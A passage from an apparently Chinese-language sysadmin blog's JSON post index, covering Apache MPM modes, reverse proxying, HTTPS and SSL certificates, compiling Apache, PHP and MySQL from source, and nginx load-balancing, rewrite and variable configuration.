#限定服务器同一时间内客户端最大接入的请求数量，默认是150；任何超过了该限制的请求都要进入等待队列，一旦一个个连接被释放，队列中的请求才将得到服务。 MaxClients 150 #每个子进程在其生命周期内允许最大的请求数量，如果请求总数已经达到这个数值，子进程将会结束，如果设置为0，子进程将永远不会结束。若该值设置为非0值，可以防止运行PHP导致的内存泄露。 MaxRequestsPerChild 0 \u003c/IfModule\u003e 创建的进程数，最多达到每秒32个，直到满足MinSpareServers设置的值为止。这就是预派生（prefork）的由来。这种模式可以不必在请求到来时再产生新的进程，从而减小了系统开销以增加性能。 并发量请求数到达MaxClients（如256）时，而空闲进程只有10个。apache为继续增加创建进程。直到进程数到达256个。 当并发量高峰期过去了，并发请求数可能只有一个时，apache逐渐删除进程，直到进程数到达MaxSpareServers为止。 work   关键字：多进程+多线程 worker模式比起上一个，是使用了多进程+多线程的模式。它也预先fork了几个子进程（数量比较少），每个子进程能够生成一些服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。 Apache总是试图维持一个备用(spare)或是空闲的服务线程池。这样，客户端无须等待新线程或新进程的建立即可得到处理。在Unix中，为了能够绑定80端口，父进程一般都是以root身份启动，随后，Apache以较低权限的用户建立子进程和线程。User和Group指令用于配置Apache子进程的权限。虽然子进程必须对其提供的内容拥有读权限，但应该尽可能给予他较少的特权。另外，除非使用了suexec ，否则，这些指令配置的权限将被CGI脚本所继承。 线程比起进程会更轻量，因为线程通常会共享父进程的内存空间，因此，内存的占用会减少一些，在高并发的场景下，表现得比 prefork模式好。 有些人会觉得奇怪，那么这里为什么不直接使用多线程呢（即在一个进程内实现多进程），还要引入多进程？ 原因主要是需要考虑稳定性，如果一个线程异常挂了，会导致父进程连同其他正常的子线程都挂了（它们都是同一个进程下的）。多进程+多线程模式中，各个进程之间都是独立的，如果某个线程出现异常，受影响的只是Apache的一部分服务，而不是整个服务。其他进程仍然可以工作。 \u003cimg src=“images/0e9464d8eaee7729ed03a8578bc93fec.png “0e9464d8eaee7729ed03a8578bc93fec”” /\u003e 优点：占据更少的内存，高并发下表现更优秀。 缺点：必须考虑线程安全的问题，因为多个子线程是共享父进程的内存地址的。如果使用keep-alive的长连接方式，也许中间几乎没有请求，这时就会发生阻塞，线程被挂起，需要一直等待到超时才会被释放。如果过多的线程，被这样占据，也会导致在高并发场景下的无服务线程可用。（该问题在prefork模式下，同样会发生） Ps：http1.1的keep-alive的长连接方式，是为了让下一次的socket通信复用之前创建的连接，从而，减少连接的创建和销毁的系统开销。保持连接，会让某个进程或者线程一直处于等待状态，即使没有数据过来。 \u003cIfModule mpm_worker_module\u003e #服务器启动时建立的子进程数量 StartServers 2 #限定服务器同一时间内客户端最大接入的请求数量，默认是150；任何超过了该限制的请求都要进入等待队列，一旦一个个连接被释放，队列中的请求才将得到服务。 MaxClients 150 #空闲子进程的最小数量 MinSpareThreads 25 #空闲子进程的最大数量 MaxSpareThreads 75 #每个子进程产生的线程数量 ThreadsPerChild 25 #每个子进程在其生命周期内允许最大的请求数量，如果请求总数已经达到这个数值，子进程将会结束，如果设置为0，子进程将永远不会结束。将该值设置为非0值，可以防止运行PHP导致的内存泄露。 MaxRequestsPerChild 0 \u003c/IfModule\u003e   理解配置：由主控制进程生成“StartServers”个子进程，每个子进程中包含固定的ThreadsPerChild线程数，各个线程独立地处理请求。同样，为了尽量避免在请求到来才生成线程，MinSpareThreads和MaxSpareThreads设置了最少和最多的空闲线程数；而MaxClients设置了所有子进程中的线程总数。如果现有子进程中的线程总数不能满足负载，控制进程将派生新的子进程。 event   关键字：多进程+多线程+epoll 这个是 Apache中最新的模式，在现在版本里的已经是稳定可用的模式。它和 worker模式很像，最大的区别在于，它解决了 keep-alive 场景下 ，长期被占用的线程的资源浪费问题（某些线程因为被keep-alive，挂在那里等待，中间几乎没有请求过来，一直等到超时）。 event MPM中，会有一个专门的线程来管理这些 keep-alive 类型的线程，当有真实请求过来的时候，将请求传递给服务线程，执行完毕后，又允许它释放。这样，一个线程就能处理几个请求了，实现了异步非阻塞。 event MPM在遇到某些不兼容的模块时，会失效，将会回退到worker模式，一个工作线程处理一个请求。官方自带的模块，全部是支持event MPM的。 \u003cimg src=“images/d78841f9f8ed72b5b8cd378d052bc910.png “d78841f9f8ed72b5b8cd378d052bc910\"” /\u003e 注意一点，event MPM需要Linux系统（Linux 2.6+）对Epoll的支持，才能启用。 还有，需要补充的是HTTPS的连接（SSL），它的运行模式仍然是类似worker的方式，线程会被一直占用，知道连接关闭。部分比 较老的资料里，说event MPM不支持SSL，那个说法是几年前的说法，现在已经支持了。 \u003cIfModule mpm_worker_module\u003e #服务器启动时建立的子进程数量 StartServers 3 #空闲子进程的最小数量 MinSpareThreads 75 #空闲子进程的最小数量 MaxSpareThreads 250 #每个子进程产生的线程数量 ThreadsPerChild 25 #限定服务器同一时间内客户端最大接入的请求数量，默认是150；任何超过了该限制的请求都要进入等待队列，一旦一个个连接被释放，队列中的请求才将得到服务。 MaxRequestWorkers 400 #每个子进程在其生命周期内允许最大的请求数量，如果请求总数已经达到这个数值，子进程将会结束，如果设置为0，子进程将永远不会结束。将该值设置为非0值，可以防止运行PHP导致的内存泄露。 MaxRequestsPerChild 0 \u003c/IfModule\u003e 本文转自：http://blog.csdn.net/STFPHP/article/details/52954303 ","date":"2019-09-23 17:17","objectID":"/post/949/:0:0","tags":["apache"],"title":"apache三种工作模式prefork、work、event","uri":"/post/949/"},{"categories":["系统服务"],"content":" 开启反向代理模块： LoadModule proxy_module modules/mod_proxy.so LoadModule proxy_http_module modules/mod_proxy_http.so LoadModule proxy_balancer_module modules/mod_proxy_balancer.so LoadModule slotmem_shm_module modules/mod_slotmem_shm.so 开启负载均衡模块： LoadModule lbmethod_byrequests_module modules/mod_lbmethod_byrequests.so LoadModule lbmethod_bytraffic_module modules/mod_lbmethod_bytraffic.so LoadModule lbmethod_bybusyness_module modules/mod_lbmethod_bybusyness.so 反向代理   1.ProxyPass指令 在反向代理到后端的url后，path是不会带过去的。此指令不支持正则。 可以使用在server config ，location，virtualhost中使用 用法： ProxyPass [path] ! | url 2.ProxyPassReverse指令 此指令一般和ProxyPass指令配合使用。 通过此指令，可以避免 在Apache作为反向 代理使用时，后端服务器的HTTP重定向造成绕过反向代理的问题。 用法： ProxyPassReverse [path] ! | url 3.ProxyPassMatch指令 用法同ProxyPass，此指令支持正则 ProxyPass [path] ! | url 例子： 全站代理： ProxyPass \"/\" \"http://www.test.com\" ProxyPassReverse \"/\" \"http://www.test.com\" 要为特定的URI进行代理，其它的所有请求都在本地处理，可执行如下配置： ProxyPass \"/images\" \"http://www.test.com\" 当客户端请求http://www.soulchild.cn/images/server.gif 这个URL时，apache将请求后端服务器http://www.test.com/server.gif 地址，注意，这里在反向代理到后端的url后，/images这个路径没有带过去。 注意：如果第一个参数path结尾添加了一个斜杠，则url部分也必须添加了一个斜杠 加斜杠 ProxyPass \"/img/flv/\" \"http://www.abc.com/isg/\" 对某个路径不做代理转发： ProxyPass / images/ ! 使用正则： ProxyPassMatch ^(/.*.gif) http://www.static.com/$1 负载均衡：   3种负载均衡算法，分别是： byrequests：默认。按照请求次数平均分配 可以手动指定权重，权重越大访问越多：loadfactor=xx bytraffic：按照I/O流量大小平均分配 bybusyness：按照挂起的请求(排队暂未处理)数量计算。分配给活跃请求数最少的服务器 编辑配置文件 vim /usr/local/apache2/conf/extra/site1.conf \u003cVirtualHost *:80\u003e ServerAdmin webmaster@dummy-host2.example.com DocumentRoot \"/usr/local/apache2/docs/site1\" ServerName apache.test.com ErrorLog \"logs/apache.test.com-error_log\" CustomLog \"logs/apache.test.com-access_log\" common \u003cProxy balancer://soulchild\u003e BalancerMember http://10.0.0.239 loadfactor=2 BalancerMember http://10.0.0.140:81 ProxySet lbmethod=byrequests \u003c/Proxy\u003e proxypass / balancer://soulchild proxypassreverse / balancer://soulchild \u003c/VirtualHost\u003e loadfactor=2可以实现，访问2次10.0.0.239，访问1次10.0.0.140按照这样的顺序访问 ","date":"2019-09-23 17:00","objectID":"/post/941/:0:0","tags":["apache"],"title":"apache配置反向代理和负载均衡","uri":"/post/941/"},{"categories":["系统服务"],"content":"在配置文件中添加如下内容： vim /usr/local/apache2/conf/extra/site1.conf \u003cLocation \"/lbstatus\"\u003e proxypass ! SetHandler balancer-manager Require ip 10.0.0.0/24 \u003c/Location\u003e 通过http://ip/lbstatus访问 ","date":"2019-09-23 16:53","objectID":"/post/946/:0:0","tags":["apache"],"title":"apache负载均衡开启状态检测页面","uri":"/post/946/"},{"categories":["系统服务"],"content":"开启模块支持： 修改http.conf文件，去掉注释 LoadModule ssl_module modules/mod_ssl.so LoadModule socache_shmcb_module modules/mod_socache_shmcb.so Include conf/extra/httpd-ssl.conf 若未安装 mod_ssl.so 模块，可通过执行yum install mod_ssl 命令安装或编译模块安装。 修改以下参数： 配置文件参数 说明 SSLEngine on 启用SSL功能 SSLCertificateFile 证书文件 SSLCertificateKeyFile 私钥文件 SSLCertificateChainFile 证书链文件   vim /usr/local/apache2/conf/extra/httpd-ssl.conf \u003cVirtualHost 0.0.0.0:443\u003e DocumentRoot \"/var/www/html\" #填写证书名称 ServerName www.domain.com #启用 SSL 功能 SSLEngine on #证书文件的路径 SSLCertificateFile /etc/httpd/ssl/2_www.domain.com.crt #私钥文件的路径 SSLCertificateKeyFile /etc/httpd/ssl/3_www.domain.com.key #证书链文件的路径 SSLCertificateChainFile /etc/httpd/ssl/1_root_bundle.crt \u003c/VirtualHost\u003e ","date":"2019-09-22 20:51","objectID":"/post/932/:0:0","tags":["apache"],"title":"apache配置https和http跳转","uri":"/post/932/"},{"categories":["系统服务"],"content":"HTTP 跳转 HTTPS 开启模块： 修改http.conf文件，去掉注释 LoadModule rewrite_module modules/mod_rewrite.so 添加跳转配置 \u003cDirectory \"/var/www/html\"\u003e # 新增 RewriteEngine on RewriteCond %{SERVER_PORT} !^443$ RewriteRule ^(.*)?$ https://%{SERVER_NAME}%{REQUEST_URI} [L,R] \u003c/Directory\u003e 重启apache服务 apache graceful ","date":"2019-09-22 20:51","objectID":"/post/932/:0:1","tags":["apache"],"title":"apache配置https和http跳转","uri":"/post/932/"},{"categories":["其他"],"content":" [root@localhost ]# vim /usr/lib/systemd/system/httpd.service [Unit] Description=apache After=network.target[Service] Type=forking ExecStart=/usr/local/apache/bin/apachectl start ExecReload=/usr/local/apache/bin/apachectl restart ExecStop=/usr/local/apache/bin/apachectl stop PrivateTmp=true [Install] WantedBy=multi-user.target   ============================================================================ 如果把PrivateTmp的值设置成true ，服务启动时会在/tmp目录下生成类似systemd-private-433ef27ba3d46d8aac286aeb1390e1b-apache.service-RedVyu的文件夹，用于存放apache的临时文件。 但有时候这相反而不方便，如：启动mysql服务，/tmp/mysql.sock文件的存放就会放到私有文件夹中，这时需要将PrivateTmp的值设置成false： 包括php访问/tmp目录下的文件提示找不到的时候可以修改为false 结论： PrivateTmp=true ","date":"2019-09-22 19:02","objectID":"/post/923/:0:0","tags":[],"title":"centos7下访问不到tmp目录下文件的问题","uri":"/post/923/"},{"categories":["基础内容"],"content":" 变量表达式 说明 ${变量#关键字} 若变量内容从头开始的数据符合“关键字”，则将符合的最短数据删除 ${变量##关键字} 若变量内容从头开始的数据符合“关键字”，则将符合的最长数据删除 ${变量%关键字} 若变量内容从尾向前的数据符合“关键字”，则将符合的最短数据删除 ${变量%%关键字} 若变量内容从尾向前的数据符合“关键字”，则将符合的最长数据删除 ${变量/旧字符串/新字符串} 若变量内容符合“旧字符串”，则第一个旧字符串会被新字符串替换 ${变量//旧字符串/新字符串} 若变量内容符合“旧字符串”，则全部的旧字符串会被新字符串替换   #\u0026##举例： [root@apache ~]# echo $str 123/456/78/9/1 #从前往后匹配，删除匹配的最短的内容--\u003e“123/” [root@apache ~]# echo ${str#*/} 456/78/9/1 #从前往后匹配，删除匹配的最长的内容--\u003e“123/456/78/9/” [root@apache ~]# echo ${str##*/} 1 %\u0026%%举例： [root@apache ~]# echo $str 123/456/78/9/1 #从后向前匹配，删除匹配最短的部分--\u003e“/1” [root@apache ~]# echo ${str%/*} 123/456/78/9 #从后向前匹配，删除匹配最长的部分--\u003e“/456/78/9/1” [root@apache ~]# echo ${str%%/*} 123 /\u0026//举例： [root@apache ~]# echo $str 123/123/234/123/1 #替换123为000 [root@apache ~]# echo ${str/123/000} 000/123/234/123/1 #替换所有123为000 [root@apache ~]# echo ${str//123/000} 000/000/234/000/1 ","date":"2019-09-19 12:09","objectID":"/post/907/:0:0","tags":["shell"],"title":"shell中变量的替换和删除","uri":"/post/907/"},{"categories":["其他"],"content":"1. 安装依赖包 yum安装依赖 yum -y install make gcc-c++ cmake bison-devel ncurses-devel libtool bison perl perl-devel perl perl-devel zlib zlib-devel ","date":"2019-09-19 11:20","objectID":"/post/903/:0:1","tags":["apache"],"title":"apache2.4.39编译安装","uri":"/post/903/"},{"categories":["其他"],"content":"2. 编译安装 编译安装apr： yum install -y bzip2 tar xf apr-1.6.3.tar.bz2 cd apr-1.6.3 ./configure --prefix=/usr/local/apr make \u0026\u0026 make install 编译安装apr-util： yum install -y expat expat-devel tar xf apr-util-1.6.1.tar.gz cd apr-util-1.6.1 ./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr make \u0026\u0026 make install 编译安装pcre： tar xf pcre-8.41.tar.gz cd pcre-8.41 ./configure --prefix=/usr/local/pcre make \u0026\u0026 make install 编译安装apache： tar xf httpd-2.4.39.tar.gz cd httpd-2.4.39 ./configure --prefix=/usr/local/apache2 \\ --with-pcre=/usr/local/pcre \\ --with-apr=/usr/local/apr \\ --with-apr-util=/usr/local/apr-util \\ --enable-so \\ --enable-modules=most \\ --enable-mods-shared=all \\ --enable-rewrite=shared make \u0026\u0026 make install ","date":"2019-09-19 11:20","objectID":"/post/903/:0:2","tags":["apache"],"title":"apache2.4.39编译安装","uri":"/post/903/"},{"categories":["其他"],"content":"3.管理apache2 #创建软连接方便使用 ln -s /usr/local/apache2/bin/apachectl /sbin/ #启动apache apachectl start #停止 apachectl stop #重启 apachectl restart #优雅重启 apachectl graceful #优雅停止 apachectl graceful-stop ","date":"2019-09-19 11:20","objectID":"/post/903/:0:3","tags":["apache"],"title":"apache2.4.39编译安装","uri":"/post/903/"},{"categories":["系统服务"],"content":"添加ssl模块举例 apxs参数说明： -i 安装 -a 激活模块(向httpd.conf添加 LoadModule指令) -c 编译指定模块 #进入源码包目录 cd /server/httpd-2.4.39/ #安装模块 /usr/local/apache2/bin/apxs -i -a -c modules/ssl/mod_ssl.c 报错： \u003cimg src=“images/eee3ed7c430ed3d9e935c8e8cc998b96.png “eee3ed7c430ed3d9e935c8e8cc998b96\"” /\u003e 解决： #安装openssl yum install -y openssl openssl-devel #再次执行 /usr/local/apache2/bin/apxs -i -a -c modules/ssl/mod_ssl.c 报错： \u003cimg src=“images/85f9f8ac7dccffa30f228cdf51e527fd.png “85f9f8ac7dccffa30f228cdf51e527fd”” /\u003e google到的一个解决方法： #把apache源码包里的modules/md文件夹中的所有文件复制到/usr/inlude文件夹下面 cp modules/md/* /usr/include/ #执行 cd /server/httpd-2.4.39/ /usr/local/apache2/bin/apxs -a -i -DHAVE_OPENSSL=1 -I/usr/include/openssl -L/usr/lib64/openssl -c modules/ssl/*.c -lcrypto -lssl -ldl #检查配置文件 apachectl -t #重启apache aapachectl graceful ","date":"2019-09-18 14:59","objectID":"/post/895/:0:0","tags":["apache"],"title":"apache动态添加SSL编译模块，报错解决","uri":"/post/895/"},{"categories":["系统服务"],"content":"1.安装依赖包 yum -y install php-mcrypt libmcrypt libmcrypt-devel autoconf freetype freetype-devel gd libmcrypt libpng libpng-devel openjpeg openjpeg-devel libjpeg libjpeg-devel libxml2 libxml2-devel zlib curl curl-devel ","date":"2019-09-18 12:00","objectID":"/post/890/:1:0","tags":["php"],"title":"php7.2编译安装","uri":"/post/890/"},{"categories":["系统服务"],"content":"2. 编译安装 tar xf php-7.2.3.tar.gz cd php-7.2.3/ ./configure --prefix=/usr/local/php7 \\ --with-apxs2=/usr/local/apache2/bin/apxs \\ --with-config-file-path=/usr/local/php7/etc/ \\ --enable-mbstring \\ --with-curl \\ --enable-fpm \\ --enable-mysqlnd \\ --enable-bcmath \\ --enable-sockets \\ --enable-ctype \\ --with-jpeg-dir \\ --with-png-dir \\ --with-freetype-dir \\ --with-gettext \\ --with-gd \\ --with-pdo-mysql=mysqlnd \\ --with-mysqli=mysqlnd make \u0026\u0026 make install ","date":"2019-09-18 12:00","objectID":"/post/890/:2:0","tags":["php"],"title":"php7.2编译安装","uri":"/post/890/"},{"categories":["系统服务"],"content":"3. 生成配置文件 cp php.ini-development /usr/local/php7/etc/php.ini ","date":"2019-09-18 12:00","objectID":"/post/890/:3:0","tags":["php"],"title":"php7.2编译安装","uri":"/post/890/"},{"categories":["系统服务"],"content":"4. 修改apache配置，使apache支持php vim /usr/local/apache2/ #配置支持解析php，配置文件末尾添加即可 Addtype application/x-httpd-php .php .phtml #添加index.php首页文件，修改现有配置 DirectoryIndex index.html index.php ","date":"2019-09-18 12:00","objectID":"/post/890/:4:0","tags":["php"],"title":"php7.2编译安装","uri":"/post/890/"},{"categories":["系统服务"],"content":"如果需要php-fpm： vim /etc/systemd/system/php-fpm.service # It's not recommended to modify this file in-place, because it # will be overwritten during upgrades. If you want to customize, # the best way is to use the \"systemctl edit\" command. [Unit] Description=The PHP FastCGI Process Manager After=network.target [Service] Type=simple PIDFile=/usr/local/php7/var/run/php-fpm.pid ExecStart=/usr/local/php7/sbin/php-fpm --nodaemonize --fpm-config /usr/local/php7/etc/php-fpm.conf ExecReload=/bin/kill -USR2 $MAINPID PrivateTmp=true [Install] WantedBy=multi-user.target ","date":"2019-09-18 12:00","objectID":"/post/890/:5:0","tags":["php"],"title":"php7.2编译安装","uri":"/post/890/"},{"categories":["系统服务","databases"],"content":"安装包下载地址：https://cdn.mysql.com/archives/mysql-5.7/mysql-boost-5.7.20.tar.gz 依赖包： yum -y install make gcc-c++ cmake bison-devel ncurses-devel libtool bison perl perl-devel perl perl-devel ","date":"2019-09-18 11:35","objectID":"/post/870/:0:0","tags":["mysql"],"title":"mysql5.7.20编译安装","uri":"/post/870/"},{"categories":["系统服务","databases"],"content":"1. 解压 tar -zxvf mysql-boost-5.7.20.tar.gz ","date":"2019-09-18 11:35","objectID":"/post/870/:1:0","tags":["mysql"],"title":"mysql5.7.20编译安装","uri":"/post/870/"},{"categories":["系统服务","databases"],"content":"2. 创建用户 useradd mysql -M -s /sbin/nologin ","date":"2019-09-18 11:35","objectID":"/post/870/:2:0","tags":["mysql"],"title":"mysql5.7.20编译安装","uri":"/post/870/"},{"categories":["系统服务","databases"],"content":"3. 编译安装 cd mysql-5.7.20/ cmake \\ -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \\ -DEXTRA_CHARSETS=all \\ -DDEFAULT_CHARSET=utf8 \\ -DDEFAULT_COLLATION=utf8_general_ci \\ -DWITH_INNOBASE_STORAGE_ENGINE=1 \\ -DWITH_MYISAM_STORAGE_ENGINE=1 \\ -DMYSQL_USER=mysql \\ -DMYSQL_TCP_PORT=3306 \\ -DWITH_BOOST=boost \\ -DENABLED_LOCAL_INFILE=1 \\ -DWITH_PARTITION_STORAGE_ENGINE=1 \\ -DMYSQL_UNIX_ADDR=/tmp/mysqld.sock \\ -DWITH_EMBEDDED_SERVER=1 make \u0026\u0026 make install ","date":"2019-09-18 11:35","objectID":"/post/870/:3:0","tags":["mysql"],"title":"mysql5.7.20编译安装","uri":"/post/870/"},{"categories":["系统服务","databases"],"content":"4. 初始化数据库 mkdir -p /data/mysql chown -R mysql.mysql /data/mysql /usr/local/mysql/bin/mysqld --initialize-insecure --user=mysql --basedir=/usr/local/mysql --datadir=/data/mysql ","date":"2019-09-18 11:35","objectID":"/post/870/:4:0","tags":["mysql"],"title":"mysql5.7.20编译安装","uri":"/post/870/"},{"categories":["系统服务","databases"],"content":"5. 编辑配置文件 vim /etc/my.cnf [mysqld] basedir=/usr/local/mysql datadir=/data/mysql socket=/tmp/mysql.sock port=3306 [mysql] socket=/tmp/mysql.sock ","date":"2019-09-18 11:35","objectID":"/post/870/:5:0","tags":["mysql"],"title":"mysql5.7.20编译安装","uri":"/post/870/"},{"categories":["系统服务","databases"],"content":"6. 创建启动脚本,启动服务 vim /etc/systemd/system/mysqld.service [Unit] Description=MySQL Server Documentation=man:mysqld(8) Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.html After=network.target After=syslog.target [Install] WantedBy=multi-user.target [Service] User=mysql Group=mysql ExecStart=/usr/local/mysql/bin/mysqld --defaults-file=/etc/my.cnf LimitNOFILE = 5000 #启动和设置开机自启 systemctl start mysqld systemctl enable mysqld ##7. 添加环境变量，在文件末尾添加 vim /etc/profile export PATH=/usr/local/mysql/bin:$PATH #执行profile，重新生效 source /etc/profile ##8.设置mysql密码 mysqladmin -S /tmp/mysql.sock -uroot password 'mima' ","date":"2019-09-18 11:35","objectID":"/post/870/:6:0","tags":["mysql"],"title":"mysql5.7.20编译安装","uri":"/post/870/"},{"categories":["基础内容","常用命令"],"content":"groupname=nginx \u0026\u0026 cat /etc/passwd | grep `grep ${groupname} /etc/group | awk -F: '{print $3}'` | awk -F: '{print $1}' \u0026\u0026 unset groupname ","date":"2019-09-12 15:34","objectID":"/post/873/:0:0","tags":[],"title":"linux查看组内成员","uri":"/post/873/"},{"categories":["其他"],"content":"https://myssl.com/ https://www.ssllabs.com/ssltest/ ","date":"2019-09-10 16:31","objectID":"/post/868/:0:0","tags":[],"title":"在线https网站验证","uri":"/post/868/"},{"categories":["基础内容"],"content":"一、证书申请过程： 生成key和csr文件—-\u003e通过csr文件向证书颁发机构(CA)申请crt文件 二、生成key和csr文件： 创建目录 mkdir /server/cert -p cd /server/cert 生成私钥和证书签署文件 openssl req -new -newkey rsa:2048 -sha256 -nodes -out test.com.csr -keyout test.com.key -subj \"/C=CN/ST=beijing/L=beijing/O=test Inc./OU=Web Security/CN=test.com\" C字段：即Country，表示单位所在国家，为两位数的国家缩写，如CN表示中国 ST字段： State/Province，单位所在州或省 L字段： Locality，单位所在城市/或县区 O字段： Organization，此网站的单位名称 OU字段： Organization Unit，下属部门名称;也常常用于显示其他证书相关信息，如证书类型，证书产品名称或身份验证类型或验证内容等 CN字段：Common Name，网站的域名 三、申请证书文件 使用csr文件申请证书即可。 1、阿里云 https://common-buy.aliyun.com/?commodityCode=cas#/buy 2、腾讯云DV SSL 证书 https://cloud.tencent.com/product/ssl 也可以自己充当CA机构 操作如下： 创建目录 mkdir /server/ca -p cd /server/ca 创建CA证书 openssl genrsa -out ca.key 2048 生成自签名证书（使用已有私钥ca.key自行签发根证书） openssl req -x509 -new -nodes -key ca.key -days 10000 -out ca.crt -subj \"/CN=my-ca\" 根据csr生成证书文件（指定步骤二中生成的证书签署文件） openssl x509 -req -in /server/cert/test.com.csr -CA ca.crt -CAkey ca.key -CAcreateserial -days 365 -out /server/cert/test.com.crt","date":"2019-09-10 16:08","objectID":"/post/859/:0:0","tags":["ssl"],"title":"SSL、TSL证书文件申请和自签证书","uri":"/post/859/"},{"categories":["系统服务"],"content":"参考：https://blog.csdn.net/chenyulancn/article/details/70800991 1.轮询（默认），每个请求按时间顺序逐一分配到不同的后端服务器，如果后端某台服务器死机，故障系统被自动剔除，使用户访问不受影响。 2.Weight，指定轮询权值，Weight值越大，分配到的访问机率越高，主要用于后端每个服务器性能不均的情况下。 举例： upstream bakend { server 192.168.0.14 weight=10; server 192.168.0.15 weight=10; } 3.ip_hash，每个请求按访问IP的hash结果分配，这样来自同一个IP的访客固定访问一个后端服务器，有效解决了动态网页存在的session共享问题。 举例： upstream bakend { ip_hash; server 192.168.0.14:88; server 192.168.0.15:80; } 4.fair（第三方） 比上面两个更加智能的负载均衡算法。根据后端服务器的响应时间来分配请求，响应时间短的优先分配。Nginx本身是不支持fair的，如果需要使用这种调度算法，必须下载Nginx的upstream_fair模块。 举例： upstream backend { server server1; server server2; fair; } 5.url_hash（第三方） 按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，可以进一步提高后端缓存服务器的效率。Nginx本身是不支持url_hash的，如果需要使用这种调度算法，必须安装Nginx 的hash软件包。 举例： upstream backend { server squid1:3128; server squid2:3128; hash $request_uri; hash_method crc32; } upstream区块特殊指令和用法： upstream：定义集群信息 server：定义集群节点（可以使用以下参数） max_fails：连接失败，重试次数（默认1） fail_timeout：重新检查间隔时间(默认10s),失败指定次数(max_fails)后,间隔(fail_timeout)时间后,重试1次，失败则结束.(成功后下次检测还是3次机会) backup：热备，所有节点不能访问时，使用backup weight：设置轮询权重(分配比例) ip_hash：同一个用户访问，分配到同一台服务器，可以解决session问题 ","date":"2019-09-09 16:46","objectID":"/post/850/:0:0","tags":["nginx"],"title":"nginx负载均衡的五种算法","uri":"/post/850/"},{"categories":["系统服务"],"content":"官方文档： http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_next_upstream 作用： 当后端服务器返回指定的错误时，将请求传递到其他服务器。 error与服务器建立连接，向其传递请求或读取响应头时发生错误; timeout在与服务器建立连接，向其传递请求或读取响应头时发生超时; invalid_header服务器返回空的或无效的响应; http_500服务器返回代码为500的响应; http_502服务器返回代码为502的响应; http_503服务器返回代码为503的响应; http_504服务器返回代码504的响应; http_403服务器返回代码为403的响应; http_404服务器返回代码为404的响应; http_429服务器返回代码为429的响应; ","date":"2019-09-09 16:36","objectID":"/post/856/:0:0","tags":["nginx"],"title":"nginx负载均衡proxy_next_upstream","uri":"/post/856/"},{"categories":["系统服务"],"content":"配置文件，没有echo模块的话可以改成return测试。 server{ listen 80; server_name test.com; access_log /tmp/test_nginx.log main; location /break/ { rewrite /break/(.*) /break/test/$1 break; location /break/test/ { echo \"break-test\"; } echo \"break\"; } location /last/ { rewrite /last/(.*) /test/$1 last; echo \"last\"; } location /test/ { echo \"test\"; } } 访问结果 1.http://test.com/break/a.txt -\u003ebreak 2.http://test.com/last/a.txt -\u003etest 3.http://test.com/test/a.txt -\u003etest 结论： last：修改uri后，根据重写后的规则，重新发起一个内部请求，跳转到其他location。 break：修改uri后，在当前字段继续向下执行，但不会匹配其他location。 ","date":"2019-09-09 15:34","objectID":"/post/845/:0:0","tags":["nginx"],"title":"nginx的rewrite中break和last区别","uri":"/post/845/"},{"categories":["系统服务"],"content":"if指令用于判断一个条件，如果条件成立，则后面的大括号内的语句将执行 语法：if (condition) { … } 默认值：none 使用字段：server, location 在默认情况下，if指令默认值为空，可在nginx配置文件的server、location部分使用，另外，if指令可以在判断语句中指定正则表达式或通过nginx内置变量匹配条件等，相关匹配条件如下： 正则表达式匹配规则： ~ 表示区分大小写匹配 ~* 表示不区分大小写匹配 !~和!~*分别表示区分大小写不匹配及不区分大小写不匹配 文件及目录匹配： -f和!-f用来判断是否存在文件 -d和!-d用来判断是否存在目录 -e和!-e用来判断是否存在文件或目录 -x和!-x用来判断文件是否可执行 举例判断浏览器UA： if ($http_user_agent ~* mac) { return 404; } ","date":"2019-09-09 13:08","objectID":"/post/837/:0:0","tags":["nginx"],"title":"nginx中if指令的使用","uri":"/post/837/"},{"categories":["系统服务"],"content":" $args #URL中的参数 $document_root #当前请求的root指令指定的值(站点目录) $uri #表示不带请求参数的当前URI，$uri不包含主机名。 $document_uri #此变量与$uri含义一样。 $host #此变量与请求头部中“Host”行指定的值一致。 $limit_rate #此变量用来设置限制连接的速率。 $request_method #此变量等同于request的method，通常是“GET”或“POST”。 $remote_addr #此变量表示客户端IP地址。 $remote_port #此变量表示客户端端口。 $remote_user #此变量等同于用户名，由ngx_http_auth_basic_module认证。 $request_filename #此变量表示当前请求的文件的路径名，由root或alias和URI request组合而成。 $request_uri #此变量表示含有参数的完整的初始URI。 $query_string #此变量与$args含义一致。 $server_addr #表示请求的服务器地址。 $server_name #服务器的主机名 $server_port #服务器的端口号 $request_uri #包含请求参数的原始URI，不包含主机名，由客户端请求决定，不能修改。 以http://10.0.0.20:8080/abc?test=123\u0026test2=abc 为例子: 其中： $args：test=123\u0026test2=abc $uri： /abc $server_addr：10.0.0.20 $server_port：8080 $request_filename：abc $request_uri：/abc?test=123\u0026test2=abc 例2：http://xxx.com:88/test1/test2/test.php ，假定虚拟主机根目录为/var/www/html 其中： $host：xxx.com $server_port：88 $request_uri： /test1/test2/test.php $document_uri：/test1/test2/test.php $document_root：/var/www/html $request_filename：/var/www/html/test1/test2/test.php ","date":"2019-09-09 11:53","objectID":"/post/829/:0:0","tags":["nginx"],"title":"nginx常用内置变量","uri":"/post/829/"},{"categories":["基础内容"],"content":" 指令 快速关闭进程 QUIT 优雅的关闭进程，即等请求结束之后再关闭 HUP 改变配置文件之后、平滑的重读配置文件 USR1 切割日志 USR2 Nginx平滑的升级 WINCH 优雅的关闭旧进程，配合USR2进行升级 ","date":"2019-09-06 14:26","objectID":"/post/823/:0:0","tags":[],"title":"kill信号","uri":"/post/823/"},{"categories":["系统服务"],"content":"参考：https://www.cnblogs.com/cheyunhua/p/10670070.html 一、设置进程数量 worker_processes：设置nginx工作的进程数，一般来说，设置成CPU核的数量即可，这样可以充分利用CPU资源 查看CPU核数： [root@nginx ]#grep ^processor /proc/cpuinfo | wc –l 在nginx1.10版本后，worker_processes指令新增了一个配置值auto，它表示nginx会自动检测CPU核数并打开相同数量的worker进程。 二、CPU亲和力（进程绑定CPU） worker_cpu_affinity：此指令可将Nginx工作进程与指定CPU核绑定，降低由于多核CPU切换造成的性能损耗。 worker_cpu_affinity使用方法是通过1、0来表示的，CPU有多少个核？就有几位数，1代表内核开启，0代表内核关闭，例如：有一个4核的服务器，那么nginx配置中worker_processes、worker_cpu_affinity的写法如下： worker_processes 4; worker_cpu_affinity 0001 0010 0100 1000; 